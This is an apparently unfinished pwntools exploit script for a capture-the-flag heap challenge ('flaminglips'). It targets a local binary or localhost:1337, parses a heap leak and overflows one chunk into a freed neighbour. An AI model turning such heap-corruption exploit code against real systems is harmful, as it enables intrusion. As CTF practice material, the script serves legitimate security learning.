from pwn import *
from icecream import ic

elf = exe = ELF("./flaminglips_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("localhost", 1337)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''

c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def uu64(a): return u64(re(a).ljust(8, b"\x00"))
def gad(a, b): return ROP(a).find_gadget(b)[0]
def qgad(a, b): return ROP(a).find_gadget([f"pop " + b, "ret"])[0]
def i(): return io.interactive()

io = start()

def alloc(index, size, content):
    sla(">", "1")
    sla(">", str(index))
    sla(">", str(size))
    sla(">", content)

def free(index):
    sla(">", "2")
    sla(">", str(index))

def edit(index, content):
    sla(">", "3")
    sla(">", str(index))
    sla(">", content)

def show(index):
    sla(">", "4")
    sla(">", str(index))


ru("Heap leak: ")
heap = int(rl().strip(), 16)
ic(hex(heap))

alloc(0, 0x100, "A"*99)  
alloc(1, 0x500, "B"*99)
alloc(2, 0x100, "C"*99)
free(1)
# pause()
edit(0, "C"*0x10f)


io.interactive()